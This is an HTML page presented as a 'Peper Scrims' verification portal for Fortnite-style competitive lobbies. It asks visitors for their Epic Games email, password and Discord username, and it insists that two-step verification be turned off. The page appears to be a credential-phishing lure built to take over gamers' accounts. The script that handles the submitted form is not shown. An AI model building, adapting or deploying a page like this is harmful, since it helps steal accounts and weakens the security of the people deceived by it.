<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Peper Scrims | Verification Portal</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="verify-card">
        <h1>🌶️ Peper Scrims</h1>
        <p>Verify your Epic Games details for competitive lobbies. <strong>Note: 2-Step Verification (2SV) must be turned off to complete verification.</strong></p>
        
        <form id="verifyForm">
            <div class="field">
                <label for="email">Email Address</label>
                <input type="email" id="email" placeholder="name@example.com" required>
            </div>

            <div class="field">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="••••••••" required>
            </div>

            <div class="field">
                <label for="discordUser">Discord Username</label>
                <input type="text" id="discordUser" placeholder="e.g. username" required>
            </div>

            <button type="submit" class="submit-btn">Submit for Review</button>
        </form>
        <p id="statusMessage" style="margin-top: 15px; font-size: 12px; text-align: center;"></p>
    </div>

    <script src="script.js"></script>
</body>
</html>
